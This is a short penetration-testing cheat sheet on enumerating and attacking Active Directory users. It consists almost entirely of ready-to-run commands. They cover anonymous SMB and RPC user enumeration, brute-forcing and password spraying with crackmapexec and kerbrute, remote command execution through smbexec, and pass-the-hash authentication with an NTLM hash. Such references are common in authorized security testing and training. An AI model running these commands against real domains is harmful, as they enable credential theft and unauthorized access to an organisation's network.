# AD Users Enumeration

## UserEnum

### CrackMapExec (SMB)

```bash
# Users enumeration
crackmapexec smb TARGET_IP -u '' -p '' --users

# Bruteforce users with password list
crackmapexec smb $IP -u users.txt -p passlist.txt # --continue-on-success

# Check user details (last logon, enabled/disabled)
crackmapexec smb $IP -u 'username' -p 'password' --exec-method smbexec -x 'net user username /domain'
```

### Enum - kerbrute

```bash
# Validate users against Kerberos
kerbrute userenum -d domain.lan users.txt --dc $IP

# Password spraying via kerbrute
kerbrute bruteuser -d domain.lan -u username -p passlist.txt --dc $IP
```

### Enum - rpcclient

```bash
# No Auth
rpcclient -U "" TARGET_IP

# List users from SAMR interface
rpcclient -U 'domain\\user%password' $IP -c 'enumdomusers'

# Query specific user info
rpcclient -U 'domain\\user%password' $IP -c 'queryuser username'
```

### SMB Shares

```bash
# List SMB shares anonymously
smbclient -L //$IP -N

# Connect to a user share (example)
smbclient //$IP/username -U username

smbmap -H TARGET_IP -u "" # Anonymous test
```

## Credentials Testing

```bash
# Testing credentials with crackmapexec (empty pass possible)
crackmapexec smb TARGET_IP -u user -p password

# Pass-the-Hash (PTH)
crackmapexec smb TARGET_IP -u user -H aad3b435b51404eeaad3b435b51404ee:password_hash
```
